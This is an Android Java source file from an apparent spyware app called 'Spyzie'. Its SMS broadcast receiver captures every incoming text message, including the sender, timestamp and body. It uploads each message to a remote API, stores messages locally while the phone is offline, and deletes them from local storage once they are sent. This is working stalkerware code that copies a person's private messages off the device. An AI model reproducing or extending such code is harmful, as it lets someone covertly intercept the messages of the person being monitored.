package com.tantd.spyzie.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.tantd.spyzie.data.db.AppDbManager;
import com.tantd.spyzie.data.model.Sms;
import com.tantd.spyzie.data.network.AppApiManager;
import com.tantd.spyzie.util.Constants;
import com.tantd.spyzie.util.NetworkUtils;
import com.tantd.spyzie.util.rx.AppSchedulerProvider;

import java.util.List;

public class SpyzieReceiver extends BroadcastReceiver {

    private static final String DEBUG_SUB_TAG = "[" + SpyzieReceiver.class.getSimpleName() + "] ";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle data = intent.getExtras();
        Object[] pdus = (Object[]) data.get("pdus");
        StringBuilder smsBody = new StringBuilder();
        SmsMessage smsMessage;
        Sms incomingSms = new Sms();
        for (int i = 0; i < pdus.length; i++) {
            smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);
            if (i == 0) {
                incomingSms.id = -1;
                incomingSms.address = smsMessage.getDisplayOriginatingAddress();
                incomingSms.time = smsMessage.getTimestampMillis();
            }
            smsBody.append(smsMessage.getMessageBody());
        }
        incomingSms.body = smsBody.toString();
        incomingSms.isIncoming = true;
        AppApiManager.getInstance().sendSmsData(incomingSms);

        if (NetworkUtils.isNetworkConnected(context)) {
            List<Sms> savedData = (List<Sms>) AppDbManager.getInstance().find(Sms.class, 0, Constants.MAX_READ_DATA_ENTRIES);
            savedData.add(incomingSms);
            AppApiManager.getInstance().sendSmsData(savedData)
                    .subscribeOn(AppSchedulerProvider.getInstance().io())
                    .observeOn(AppSchedulerProvider.getInstance().ui())
                    .subscribe(commonResponse -> {
                                savedData.remove(savedData.size() - 1);
                                if (savedData.size() > 0) {
                                    AppDbManager.getInstance().removeSms(savedData);
                                }
                            },
                            error -> {
                                if (Constants.IS_DEBUG_MODE) {
                                    Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "handleSendingError: " + error);
                                }
                                AppDbManager.getInstance().put(incomingSms);
                            });
        } else {
            AppDbManager.getInstance().put(incomingSms);
        }
    }
}
